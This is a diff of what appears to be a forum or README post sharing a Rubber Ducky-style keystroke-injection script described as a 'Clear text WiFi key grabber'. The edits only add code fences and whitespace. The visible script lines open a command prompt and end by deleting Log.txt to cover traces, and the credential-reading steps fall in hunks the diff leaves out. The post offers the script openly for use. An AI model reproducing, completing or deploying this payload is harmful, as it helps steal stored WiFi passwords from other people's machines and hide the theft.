@@ -14,9 +14,10 @@ Change the following things;
 If you have any suggestions please tell me.
 Code:
 
-REM Author: Siem
-REM Version: 1
-REM Description: Clear text WiFi key grabber
+REM Author: Siem  
+REM Version: 1  
+REM Description: Clear text WiFi key grabber  
+```
 DELAY 2000
 WINDOWS d
 REM --> Open cmd
@@ -82,3 +83,4 @@ ENTER
 REM --> Delete Log.txt and exit
 STRING del Log.txt & exit
 ENTER
+```
